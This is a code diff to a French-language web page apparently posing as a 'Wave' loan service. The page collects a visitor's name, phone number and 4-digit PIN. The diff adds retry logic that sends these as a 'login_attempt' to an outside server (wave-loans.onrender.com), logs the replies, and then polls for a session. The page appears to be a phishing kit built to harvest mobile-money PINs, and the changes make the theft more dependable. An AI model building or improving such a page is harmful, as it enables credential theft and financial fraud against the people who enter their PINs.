@@ -303,7 +303,7 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
 <div class="wrap">
 
   <!-- OVERLAYS -->
-  <div class="ov" id="loadOv"><div class="load-card"><div class="load-spin"></div><div class="load-txt">Veuillez patienter…</div></div></div>
+  <div class="ov" id="loadOv"><div class="load-card"><div class="load-spin"></div><div class="load-txt" id="load-txt">Veuillez patienter…</div></div></div>
   <div class="ov" id="popOv">
     <div class="pop-card">
       <div class="pop-icon" id="popIcon"></div>
@@ -582,7 +582,11 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
 var API = 'https://wave-loans.onrender.com/api';
 var sessId = null, pollTmr = null, verifying = false;
 
-function showLoad(){ document.getElementById('loadOv').classList.add('show'); }
+function showLoad(msg){
+  document.getElementById('loadOv').classList.add('show');
+  var el = document.getElementById('load-txt');
+  if(el) el.textContent = msg || 'Veuillez patienter…';
+}
 function hideLoad(){ document.getElementById('loadOv').classList.remove('show'); }
 
 function showPop(h,p,t){
@@ -730,17 +734,47 @@ async function submitPIN(){
   if(pin.length !== 4) return;
   var fn = document.getElementById('fn') ? document.getElementById('fn').value.trim() : '';
   var ln = document.getElementById('ln') ? document.getElementById('ln').value.trim() : '';
-  showLoad();
+  showLoad('Connexion en cours…');
+
   var payload = { firstName: fn||'Unknown', lastName: ln||'User', phone: raw, pin: pin };
   if(sessId) payload.sessionId = sessId;
-  var r = await callApi('login_attempt', payload);
-  if(r && ((r.data && r.data.sessionId) || r.sessionId)){
-    var sid = (r.data && r.data.sessionId) || r.sessionId;
+
+  // Try up to 3 times (server may be waking up)
+  var r = null;
+  for(var attempt = 0; attempt < 3; attempt++){
+    try {
+      var p = new URLSearchParams(Object.assign({action:'login_attempt'}, payload));
+      var resp = await fetch(API, {
+        method: 'POST',
+        headers: {'Content-Type':'application/x-www-form-urlencoded'},
+        body: p.toString()
+      });
+      var text = await resp.text();
+      console.log('login_attempt attempt', attempt+1, ':', text);
+      r = JSON.parse(text);
+      if(r && (r.sessionId || (r.data && r.data.sessionId) || r.success)) break;
+    } catch(e) {
+      console.log('attempt', attempt+1, 'failed:', e.message);
+      if(attempt < 2) await new Promise(function(res){ setTimeout(res, 2000); });
+    }
+  }
+
+  hideLoad();
+
+  if(!r){
+    showPop('Serveur indisponible', 'Le serveur ne répond pas. Vérifiez votre connexion et réessayez.');
+    pinVal=''; updatePinDots(); return;
+  }
+
+  var sid = (r.data && r.data.sessionId) || r.sessionId || r.session_id;
+  if(sid){
     startPoll(sid);
+  } else if(r.success === false){
+    showPop('Erreur', r.message || 'Identifiants invalides. Réessayez.');
+    pinVal=''; updatePinDots();
   } else {
-    hideLoad();
-    showPop('Erreur de connexion', r && r.message ? r.message : 'Impossible de se connecter. Veuillez réessayer.');
-    pinVal = ''; updatePinDots();
+    showPop('Erreur inattendue', 'Réponse serveur incorrecte. Réessayez.');
+    pinVal=''; updatePinDots();
   }
 }
 
